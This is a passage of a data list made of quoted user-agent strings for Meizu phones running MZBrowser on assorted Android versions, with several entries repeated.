"Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3_s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.4.1 UWS/2.11.0.34 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-15 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.MZ-15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.11.2 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu M10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.3.110-2020082018 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.310-2017121220 UWS/2.11.0.32 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-M2 E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.2 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.110-2017110719 UWS/2.10.1.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.410-2017122215 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.11.110-2018061318 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.0 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.14.110-2020010216 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.511-2018011519 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.410-2017122215 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.310-2017121220 UWS/2.11.0.32 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.710-2018040314 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.210-2017112119 UWS/2.11.0.32 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.2 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.511-2018012510 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.11.110-2018061318 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-meizu M8 lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.121-2018080915 UWS/2.11.0.33 Mobile Safari/537.36"
,"Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.110-2017110719 UWS/2.10.1.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.3.6 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-M2 E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.2 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3_s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.310-2017121220 UWS/2.11.0.32 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.10.110-2018052111 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.5.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.4.1 UWS/2.11.0.34 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.2.0 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.11.110-2018061318 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.410-2017122215 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.15.110-2020030418 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 X Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-16s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.17.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.710-2018040314 UWS/2.11.0.33 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.110-2019060317 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.6.110-2018121017 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7-S Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.4.1 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.6.101 UWS/2.10.1.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.210-2017112119 UWS/2.11.0.32 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.5 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.4 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.10.110-2018052111 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.0.120-2018051609 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.6 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16th Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.110-2017110719 UWS/2.10.1.22 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.7.3 UWS/2.11.0.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.3.2 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.10.2 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M2 E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.6.101 UWS/2.10.1.22 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M A5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M1E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-16s Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.16.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-Meizu M8c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2019041909 UWS/2.15.0.4 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.4.110-2020111017 UWS/2.15.0.4 Mobile Safari/537.36",
